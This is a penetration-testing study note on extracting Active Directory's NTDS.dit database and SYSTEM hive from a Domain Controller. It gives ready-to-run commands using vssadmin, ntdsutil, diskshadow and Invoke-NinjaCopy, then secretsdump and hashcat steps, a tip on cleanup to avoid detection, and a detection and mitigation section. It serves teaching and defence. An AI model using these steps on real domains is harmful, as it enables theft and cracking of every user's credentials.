---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.33 NTDS.dit Extraction"
---

# NTDS.dit Extraction

## Introduction
The extraction of the `NTDS.dit` file is one of the most critical objectives for a red teamer or penetration tester once Domain Administrator or equivalent high-level privileges have been obtained on an Active Directory (AD) Domain Controller. The `NTDS.dit` file is the heart of Active Directory. It is an Extensible Storage Engine (ESE) database that stores all the Active Directory data, including user objects, groups, group memberships, and, most importantly, the password hashes for all users in the domain. 

Successfully extracting this file allows an attacker to perform offline password cracking, Golden Ticket creation, and extensive offline reconnaissance of the entire domain structure without generating further noise on the target network.

## Understanding NTDS.dit
The `NTDS.dit` (New Technology Directory Services Directory Information Tree) file is located by default at `C:\Windows\NTDS\ntds.dit` on Domain Controllers. It is locked by the Local Security Authority Subsystem Service (LSASS) while the Domain Controller is running, meaning it cannot be simply copied using standard file copy commands (like `copy` or `xcopy`).

In addition to the database file itself, an attacker also needs the `SYSTEM` registry hive to decrypt the contents of the `NTDS.dit` file. The `SYSTEM` hive contains the Boot Key (also known as the SysKey), which is required to decrypt the Password Encryption Key (PEK) stored within the `NTDS.dit` file. The PEK is then used to decrypt the actual NTLM hashes.

## ASCII Architecture Diagram

```text
+---------------------------------------------------------------+
|                 Domain Controller Operating System              |
|                                                               |
|  +--------------------+       +----------------------------+  |
|  |   Registry Hives   |       |   Active Directory DB      |  |
|  |                    |       |                            |  |
|  | C:\Windows\System32|       | C:\Windows\NTDS\ntds.dit   |  |
|  | \config\SYSTEM     |       |                            |  |
|  +---------+----------+       +-------------+--------------+  |
|            |                                |                 |
|            v                                v                 |
|       [Boot Key]                      [Encrypted PEK]         |
|            |                                |                 |
|            +--------------+-----------------+                 |
|                           |                                   |
|                           v                                   |
|               +-----------------------+                       |
|               | Decryption Process    |                       |
|               +-----------------------+                       |
|                           |                                   |
|                           v                                   |
|                  [Decrypted NTLM Hashes]                      |
|                  [Kerberos Keys]                              |
|                  [User Data]                                  |
+---------------------------------------------------------------+
```

## Extraction Methodologies
Because the file is locked by the operating system, attackers must use techniques that bypass file locks. The most common approach is using Volume Shadow Copy Service (VSS), a built-in Windows feature that creates snapshots of volumes.

### Method 1: Using VSSAdmin
The `vssadmin` utility is a built-in command-line tool that manages Volume Shadow Copies.

1. **Create a Shadow Copy:**
   ```cmd
   vssadmin create shadow /for=C:
   ```
   *Expected Output: "Successfully created shadow copy for 'C:\'..."*
   *Note the Shadow Copy Volume Name (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`).*

2. **Copy the NTDS.dit File:**
   ```cmd
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
   ```

3. **Copy the SYSTEM Hive:**
   ```cmd
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
   ```

4. **Clean up the Shadow Copy:**
   ```cmd
   vssadmin delete shadows /shadow={ShadowCopyId} /quiet
   ```
   *Always clean up to avoid detection and save disk space.*

### Method 2: Using NTDSUtil
`ntdsutil` is another built-in tool specifically designed for Active Directory database management. The `IFM` (Install From Media) creation feature can be abused to extract a copy of the database and the registry hives.

1. **Create the IFM Dump:**
   ```cmd
   ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds_dump" q q
   ```
   *This command creates a complete copy of the Active Directory database, including the necessary registry hives, in the `c:\temp\ntds_dump` directory. It automatically handles the VSS snapshot creation and deletion.*

### Method 3: Using DiskShadow
`diskshadow` is a built-in tool that exposes VSS functionality. It can be run interactively or via a script file, which makes it an excellent choice for bypassing restrictions that might monitor or block `vssadmin` or `ntdsutil`.

1. **Create a script file (e.g., `script.txt`):**
   ```text
   set context persistent nowriters
   add volume c: alias temp_alias
   create
   expose %temp_alias% z:
   ```

2. **Execute DiskShadow:**
   ```cmd
   diskshadow /s script.txt
   ```

3. **Copy the files:**
   ```cmd
   copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
   copy z:\windows\system32\config\system c:\temp\SYSTEM
   ```

4. **Clean up:**
   ```text
   unexpose z:
   delete shadows volume c:
   ```

### Method 4: Invoke-NinjaCopy
If VSS is monitored or blocked, PowerShell can be used to bypass file locks by directly interacting with the raw disk volume. `Invoke-NinjaCopy` is a script from the PowerSploit framework that achieves this.

1. **Execute NinjaCopy:**
   ```powershell
   Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
   Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\temp\SYSTEM"
   ```

## Parsing and Cracking
Once the `NTDS.dit` and `SYSTEM` files are extracted and transferred to the attacker's machine, they must be parsed to extract the NTLM hashes.

### Using Impacket's secretsdump.py
`secretsdump.py` is the industry standard for this task. It can parse the database offline.

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile ntds_hashes
```
This command will output the hashes in the standard `pwdump` format: `User:RID:LMHash:NTLMHash:::`.

### Password Cracking
After extraction, Hashcat or John the Ripper can be used to crack the NTLM hashes offline.

```bash
hashcat -m 1000 ntds_hashes.ntds wordlist.txt -r rules/best64.rule
```

## Detection and Mitigation
Extracting `NTDS.dit` is a highly privileged action, and detecting it relies on monitoring process execution, command-line arguments, and VSS events.

1. **Event Log Monitoring:**
   - **Event ID 4688 (Process Creation):** Monitor for processes like `vssadmin.exe`, `ntdsutil.exe`, and `diskshadow.exe`. Pay close attention to command-line arguments like `create shadow`, `ifm`, or script execution parameters.
   - **Event ID 4799 (Security Group Management):** Monitor for suspicious additions to the Domain Admins or Backup Operators groups, as these privileges are often required for extraction.
   - **Event ID 7036 (Service Control Manager):** Monitor the start and stop events for the Volume Shadow Copy service (`VSS`). Frequent starting of this service outside of normal backup windows is highly suspicious.

2. **File System Monitoring:**
   - Monitor the `C:\Windows\NTDS` directory for unauthorized access or unusual file operations.
   - Monitor for the creation of large files named `ntds.dit` in temporary directories (e.g., `C:\temp`, `C:\Windows\Temp`).

3. **Behavioral Analysis:**
   - Detect PowerShell scripts interacting directly with raw disk volumes (e.g., reading from `\\.\C:`).
   - Implement EDR (Endpoint Detection and Response) solutions that flag suspicious use of built-in administrative tools.

## Chaining Opportunities
- `NTDS.dit` extraction is the ultimate post-exploitation step following successful privilege escalation via [[30 - Kerberoasting]] or [[32 - AS-REP Roasting]].
- The extracted hashes can be used to forge a Golden Ticket for long-term persistence, tying into [[44 - Golden Ticket Attacks]].
- Hashes can be used for Pass-the-Hash (PtH) attacks to pivot to other systems.

## Related Notes
- [[10 - Windows Privilege Escalation Basics]]
- [[25 - Active Directory Enumeration]]
- [[34 - LOLBins]]
- [[39 - Windows Defender Evasion Basics]]
